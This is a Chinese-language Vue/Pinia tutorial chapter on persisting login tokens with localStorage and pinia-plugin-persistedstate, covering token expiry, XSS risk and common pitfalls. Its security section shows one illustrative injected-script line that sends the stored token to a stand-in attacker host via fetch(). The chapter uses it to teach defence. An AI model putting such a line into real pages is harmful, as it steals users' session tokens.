# 10.3 状态持久化

## 一个具体的场景

登录功能做完，你兴冲冲地打开页面测试：

1. 登录成功，导航栏显示"张审核员"，一切正常。
2. 手一抖按了 `F5` 刷新。
3. 页面回到未登录状态，被路由守卫踢回了登录页。

**用户会立刻来投诉**：我只是刷新了一下，怎么就退出了？
刷新就掉登录态的产品，没人愿意用。

问题出在：`useAuthStore` 里的 `token` 只活在内存里。
浏览器一刷新，JavaScript 的内存就被清空，`token` 自然没了。
要让它留下来，就得把状态写进浏览器能长期保存的地方 —— 最常用的是 `localStorage`。

::: tip 什么状态值得持久化
- **该持久化**：登录凭证（token）、用户偏好（主题、语言、列表每页条数）、
  跨刷新要保留的筛选条件。
- **不该持久化**：加载态（`loading`）、错误信息（`error`）、
  弹窗开关、临时表单草稿、任何敏感信息（密码）。
:::

## 方案一：手写持久化

不引入任何插件，自己在 store 里读写 `localStorage`。分两步：
**初始化时从 `localStorage` 读**，**状态变化时写回去**。

```js [src/stores/auth.js]
import { ref, watch } from 'vue'
import { defineStore } from 'pinia'

// 统一约定一个 key，避免各处写错字符串
const STORAGE_KEY = 'campus-auth'

function readStorage() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY)
    return raw ? JSON.parse(raw) : {}
  } catch {
    // 存的内容被手改坏了，返回空对象，别让应用启动就崩
    return {}
  }
}

export const useAuthStore = defineStore('auth', () => {
  const saved = readStorage()

  // ✓ 用读到的值作为初始值，注意要给默认值兜底
  const token = ref(saved.token || '')
  const username = ref(saved.username || '')
  const role = ref(saved.role || '')
  const loading = ref(false) // ← 不持久化

  // ✓ 状态变了就写回去
  watch(
    [token, username, role],
    () => {
      localStorage.setItem(
        STORAGE_KEY,
        JSON.stringify({
          token: token.value,
          username: username.value,
          role: role.value
        })
      )
    },
    { deep: true }
  )

  function logout() {
    token.value = ''
    username.value = ''
    role.value = ''
    localStorage.removeItem(STORAGE_KEY) // ✓ 退出时把持久化数据也清掉
  }

  return { token, username, role, loading, logout }
})
```

### 手写的三个坑

**坑一：`deep` 该不该开。** `watch` 默认只监听"引用有没有变"。
上面监听的是三个 `ref` 本身，`ref.value = 'x'` 会触发，所以不用 `deep`。
但如果要监听的是一个对象（比如整个 `user` 对象），就必须 `deep: true`，
否则改 `user.value.username` 不会触发写回：

```js
watch(user, writeToStorage, { deep: true }) // 对象内部变化也要监听
```

**坑二：JSON 序列化会丢东西。** `JSON.stringify` 处理不了这些值：

| 原值 | `JSON.stringify` 之后 | 再 `JSON.parse` 得到 |
| --- | --- | --- |
| `undefined` | 整个属性被丢掉 | 属性不存在 |
| `Date` 对象 | `"2026-09-13T00:00:00.000Z"`（字符串） | 字符串，不是 Date |
| `Map` / `Set` | `{}` | 空对象 |
| 函数 | 被丢掉 | 属性不存在 |
| `NaN` / `Infinity` | `null` | `null` |

所以**只持久化字符串和纯对象/数组**。如果确实要存日期，存成时间戳，读出来再 `new Date()`。

**坑三：写入太频繁。** 表单输入、滚动位置这类高频变化的值，
每变一次就 `localStorage.setItem` 会卡。`watch` 加 `flush: 'post'` 或做防抖，
或者干脆不持久化高频值。

::: warning `localStorage` 是同步的
`localStorage.setItem` 会**阻塞主线程**。写几十 KB 可能感觉不出来，
但如果每次都序列化一个几百条记录的列表，页面会一顿一顿的。
**持久化只存小数据** —— token 和几个字段，不要存接口返回的大列表。
:::

## 方案二：用持久化插件

手写的问题在于：每个 store 都要写一遍读、写、清理的逻辑，重复且容易漏。
社区插件 `pinia-plugin-persistedstate` 把这件事做掉了。

### 安装与注册

```bash
pnpm add pinia-plugin-persistedstate
```

```js [src/main.js]
import { createApp } from 'vue'
import { createPinia } from 'pinia'
import piniaPluginPersistedstate from 'pinia-plugin-persistedstate'
import App from './App.vue'

const pinia = createPinia()
pinia.use(piniaPluginPersistedstate) // ✓ 装上插件

const app = createApp(App)
app.use(pinia)
app.mount('#app')
```

### 在 store 上开启

```js [src/stores/auth.js]
import { ref } from 'vue'
import { defineStore } from 'pinia'

export const useAuthStore = defineStore(
  'auth',
  () => {
    const token = ref('')
    const username = ref('')
    const role = ref('')
    const loading = ref(false)

    return { token, username, role, loading }
  },
  {
    // ✓ 第三个参数是持久化配置
    persist: {
      // 只挑这几个字段持久化，加载态不进去
      pick: ['token', 'username', 'role'],
      key: 'campus-auth'
    }
  }
)
```

只需加第三个参数，读写与恢复全自动。默认用 `localStorage` 存，
默认 key 是 store 的 id（这里是 `auth`），上面的 `key` 用于自定义。

### `pick` 与 `paths` 的区别

这两个配置容易混，**不同版本的插件用的名字不一样**：

| 配置 | 用在哪个版本 | 含义 |
| --- | --- | --- |
| `paths` | v3 及更早 | 指定要持久化的字段路径，支持 `a.b.c` 这类嵌套路径 |
| `pick` | v4 起 | 功能相同，新名字，语义更直白 |

```js [两种写法的对照]
// v3 写法
persist: { paths: ['token', 'user.username'] }

// v4 写法（推荐）
persist: { pick: ['token', 'user.username'] }
```

::: tip 只有 `pick` 不能穷举时，用 `omit`
如果字段很多、只想排除一两个，用 `omit` 比 `pick` 反着写更省事：

```js
persist: { omit: ['loading', 'error'] }
```

**优先用 `pick`**：明确列出"要存的"，比"除了这些都要存"安全 ——
以后 store 里新增了敏感字段，`pick` 不会把它顺手存进去，`omit` 就会。
:::

### 常用配置项

| 配置项 | 作用 | 例子 |
| --- | --- | --- |
| `key` | 存储用的 key | `'campus-auth'` |
| `storage` | 存到哪，默认 `localStorage` | `sessionStorage` |
| `pick` | 只持久化这些字段 | `['token', 'username']` |
| `omit` | 排除这些字段 | `['loading']` |
| `serializer` | 自定义序列化 | `{ serialize: JSON.stringify, deserialize: JSON.parse }` |

::: details 什么时候用 `sessionStorage` 而不是 `localStorage`
`sessionStorage` 的数据在**关闭标签页后就没了**，`localStorage` 会一直留着。

- 登录凭证要"下次打开还在" → `localStorage`。
- 只在本次浏览有效、更在意安全的临时状态 → `sessionStorage`。

本课程的登录态用 `localStorage`，因为用户期望"记住我"。
:::

## 持久化的安全边界

这是**必须讲清楚**的一节，很多教程一句"把 token 存 `localStorage`"就带过了。

### `localStorage` 能被同域的任何 JavaScript 读到

`localStorage` 没有权限隔离。**只要页面里跑了一段别人的脚本，它就能读出你的 token。**

最常见的攻击方式叫 XSS（跨站脚本）：攻击者想办法让你的页面执行一段恶意脚本，
比如通过一个没过滤的用户评论、一个被篡改的第三方统计脚本。
一旦脚本跑起来：

```js [攻击者注入的脚本（示意）]
// 把 token 悄悄发到攻击者服务器
fetch('https://evil.example.com/steal?t=' + localStorage.getItem('campus-auth'))
```

**攻击者不需要知道你的代码逻辑，`localStorage` 里所有东西他都能拿走。**
更要命的是，持久化的数据里往往还有用户名、角色，攻击者拿到就能冒充这个用户。

### 那到底能不能存

能存，但要守住三条边界：

1. **只存必要的**：token 与最小用户信息。**绝不存密码、身份证号、支付信息**。
2. **认知到风险存在**：`localStorage` 里的 token 是"一旦 XSS 就失守"的。
   更安全的做法是让后端把 token 放在 `HttpOnly` Cookie 里（JavaScript 读不到），
   但那需要前后端一起配合，超出本课程范围。
3. **给 token 设过期时间**，让它丢了也没那么值钱。

::: danger 三个明确不要做的事
1. 不要把密码、身份证号、银行卡号持久化 —— 哪怕加密了也不行，前端加密挡不住 XSS。
2. 不要在控制台里打印 token（`console.log(token)`），截图和录屏会泄露。
3. 不要把 token 拼进 URL 参数（会进浏览器历史、被日志记录）。
:::

### token 过期怎么处理

token 有有效期（比如 2 小时）。过期后再请求，后端返回 `401`。有两种处理：

**做法一：过期就退出登录，跳登录页。** 简单可靠，本课程用这个。

```js [src/api/request.js（节选）]
// 响应拦截器里统一处理
if (status === 401) {
  const authStore = useAuthStore()
  authStore.logout() // 清 token、清持久化
  router.push('/login') // 用 router 跳，不要整页刷新
}
```

**做法二：用 refresh token 静默续期。** 存一个有效期更长的 refresh token，
访问 token 过期时用它换一个新的，用户无感。实现复杂，会引入"多个请求同时刷新"的并发问题，
本课程不做，需要时再学。

::: tip 前端也要做一次过期判断
后端返回 `401` 是最后一道防线。但如果用户打开页面时 token 已经过期，
**可以在恢复登录态时先检查一遍**，直接跳登录页，少发一个注定失败的请求：

```js
function isExpired(token) {
  try {
    // 假设 token 是 JWT，第二段是负载
    const payload = JSON.parse(atob(token.split('.')[1]))
    return payload.exp * 1000 < Date.now()
  } catch {
    return true // 解析不了就当过期处理
  }
}
```
:::

## 实战：登录态模块的持久化

把上面的做法合起来，写出完整的登录态模块。

```js [src/stores/auth.js]
import { ref, computed } from 'vue'
import { defineStore } from 'pinia'
import { loginApi, logoutApi, getUserInfoApi } from '@/api/auth'

export const useAuthStore = defineStore(
  'auth',
  () => {
    // ---- 需要持久化的状态 ----
    const token = ref('')
    const username = ref('')
    const role = ref('')

    // ---- 不持久化的状态 ----
    const loading = ref(false)
    const error = ref('')

    // ---- 派生值 ----
    const isLoggedIn = computed(() => Boolean(token.value))
    const isReviewer = computed(() => role.value === 'reviewer')

    // ---- 动作 ----
    async function login(form) {
      loading.value = true
      error.value = ''
      try {
        const res = await loginApi(form)
        token.value = res.token
        const info = await getUserInfoApi()
        username.value = info.username
        role.value = info.role
      } catch (e) {
        error.value = e.message || '登录失败，请检查账号密码'
        throw e
      } finally {
        loading.value = false
      }
    }

    async function refreshUserInfo() {
      if (!token.value) return
      const info = await getUserInfoApi()
      username.value = info.username
      role.value = info.role
    }

    async function logout() {
      try {
        await logoutApi() // 通知后端作废 token，失败也不影响前端退出
      } catch {
        // 忽略：后端接口挂了也要让用户退出去
      }
      token.value = ''
      username.value = ''
      role.value = ''
      error.value = ''
    }

    return {
      token, username, role, loading, error,
      isLoggedIn, isReviewer,
      login, refreshUserInfo, logout
    }
  },
  {
    persist: {
      // ✓ 只持久化登录凭证与用户基本信息
      // ✓ loading、error 不进 localStorage
      pick: ['token', 'username', 'role'],
      key: 'campus-auth'
    }
  }
)
```

::: warning 退出登录必须把持久化数据清掉
用插件时，`token.value = ''` 之后插件会把空值写回 `localStorage`，
这已经算"清掉"了。但如果只调 `localStorage.removeItem` 却没改 store，
内存里还是登录状态 —— **两边都要处理**。

用了插件就统一通过改 store 状态来清，不要在业务代码里手动 `localStorage.removeItem(STORAGE_KEY)`。
:::

### 路由守卫改成读 store

持久化之后，[单元 9](/unit09/03-guards) 里那段守卫里直接读 `localStorage` 的代码可以简化：

```js [src/router/index.js]
import { useAuthStore } from '@/stores/auth'

router.beforeEach((to) => {
  const authStore = useAuthStore() // ✓ 在守卫内部调用

  // ✓ 只读 store，不再关心数据是不是来自 localStorage
  if (to.meta.requiresAuth && !authStore.isLoggedIn) {
    return { name: 'login', query: { redirect: to.fullPath } }
  }
})
```

好处是：**登录状态的"唯一来源"变成了 store**。
以后 token 存哪里、怎么过期、要不要换方案，都只改 store 一个文件。

## 小结

- 刷新会清空内存状态，登录凭证、用户偏好、要保留的筛选条件需要持久化。
- 手写方案：读 `localStorage` 作初始值 + `watch` 写回；注意 `deep` 与 JSON 序列化限制。
- 插件方案：`pinia-plugin-persistedstate`，第三个参数里用 `pick` 选字段（旧版叫 `paths`）。
- `localStorage` 会被同域任何脚本读到，XSS 场景下 token 会被偷走；只存必要的、别存敏感信息。
- token 过期靠后端 `401` 兜底，前端恢复登录态时也可以先查一遍。
- 退出登录要同时清内存状态与持久化数据，且统一通过 store 改。

## 常见坑

::: details 坑 1：把 `loading` 也持久化了，刷新后一直转圈
现象：刷新页面，列表一直在加载中，等了很久也不出来。

原因：`loading: true` 被写进了 `localStorage`，刷新时读回来又是 `true`，
但请求已经中断了，没人把它改回 `false`。

怎么处理：`pick: ['token', 'username', 'role']`，**加载态、错误信息一律不持久化**。
:::

::: details 坑 2：存了对象却读出来是个字符串
现象：`user.value.name` 是 `undefined`，`user.value` 却是 `"{\"name\":\"张三\"}"`。

原因：写入时 `JSON.stringify` 了，读出时忘了 `JSON.parse`。

怎么处理：读写成对。用插件就不存在这个问题，它的 `serializer` 已经处理好了。
:::

::: details 坑 3：把日期存进去，读出来变成字符串
现象：`createdAt` 本来是 `Date`，从 `localStorage` 读回来后，
`createdAt.getTime()` 报错说 "not a function"。

原因：`JSON.stringify(new Date())` 得到的是 ISO 字符串。

怎么处理：**存时间戳**（`Date.now()` 的结果），用的时候再 `new Date(ts)`。
或者读出来手动转：`new Date(saved.createdAt)`。
:::

::: details 坑 4：改了 store 但 `localStorage` 没更新
现象：手写方案里，登录后刷新还是未登录。

原因：`watch` 没触发。常见于监听对象却没开 `deep`。

怎么处理：监听对象时加 `{ deep: true }`；或者直接改用插件，省去手写。
:::

::: details 坑 5：多个标签页状态不同步
现象：开了两个标签页，在 A 里退出登录，B 里还是登录状态，还能点进去。

原因：内存状态是各标签页独立的，`localStorage` 的变更不会自动同步到另一个页面的内存。

怎么处理：监听 `storage` 事件（另一个标签页改 `localStorage` 时触发）：

```js
window.addEventListener('storage', (e) => {
  if (e.key === 'campus-auth') {
    // 重新从存储恢复状态，或直接提示用户刷新
    location.reload()
  }
})
```

本课程不强制要求，但要知道**存在这个不一致**。
:::

::: details 坑 6：`localStorage` 存满了
现象：写入报 `QuotaExceededError`。

原因：`localStorage` 通常只有 5 MB 左右，被大列表撑满了。

怎么处理：持久化只存小数据，列表这类大体积数据存 IndexedDB 或不持久化。
排查用 `Object.keys(localStorage)` 看都存了什么。
:::

## 课后练习

::: details 练习 1：给活动列表模块加上筛选条件持久化
让活动列表的筛选条件（关键词、状态、每页条数）在刷新后保留，
但**页码不保留**（刷新回到第一页更符合预期）。

**参考思路**：用 `pick: ['filters.keyword', 'filters.status', 'filters.pageSize']`。
想清楚"为什么页码不持久化更好" —— 用户从第一页切到第五页、刷新后回到第五页，
下次数据变了可能这一页是空的。
:::

::: details 练习 2：验证 XSS 能偷到 token
在一个**只有你自己**的测试页面里，往控制台粘贴一段读取 `localStorage` 的脚本，
观察它能不能拿到登录态。然后把这段脚本想象成第三方统计脚本里的代码。

**只在本地测试项目里做，不要对任何真实网站做这件事。**

**参考思路**：这一步的目的是**建立风险意识**：你亲眼看到 token 被读走之后，
才会真的在意"哪些字段不该持久化"。
:::

::: details 练习 3：给 token 加一个过期检查
写一个 `isTokenExpired(token)` 函数（解析 JWT 的 `exp`），
在 store 恢复登录态时调用：过期就直接清空状态。

**参考思路**：`atob` 能解 Base64，但要注意 JWT 的 Base64URL 编码里有 `-` 和 `_`，
需要先替换成 `+` 和 `/`。解析失败时要 catch，当作过期处理，别让应用崩在启动阶段。
:::

---

上一节：[10.2 Pinia 两种写法](/unit10/02-pinia-basics) ·
下一节：[10.4 请求层封装](/unit10/04-request-layer)
